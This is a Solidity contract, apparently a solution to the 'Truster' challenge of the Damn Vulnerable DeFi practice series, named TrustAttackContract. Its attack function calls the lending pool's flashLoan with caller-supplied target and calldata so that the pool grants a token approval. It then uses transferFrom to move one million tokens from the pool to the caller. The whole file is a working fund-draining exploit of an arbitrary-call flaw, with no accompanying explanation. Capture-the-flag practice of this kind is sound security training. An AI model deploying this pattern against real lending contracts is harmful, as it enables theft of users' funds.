// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";

contract TrustAttackContract {
    TrusterLenderPool public trusterLenderPool;
    IERC20 public immutable damnValuableToken;

    constructor(address _poolAddress, address _tokenAddress) {
        trusterLenderPool = TrusterLenderPool(_poolAddress);
        damnValuableToken = IERC20(_tokenAddress);
    }

    function attack(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) public {
        //!this line should get the approval from the lending pool
        trusterLenderPool.flashLoan(borrowAmount, borrower, target, data);

        damnValuableToken.transferFrom(
            address(trusterLenderPool),
            msg.sender,
            1000000 ether
        );
    }
}
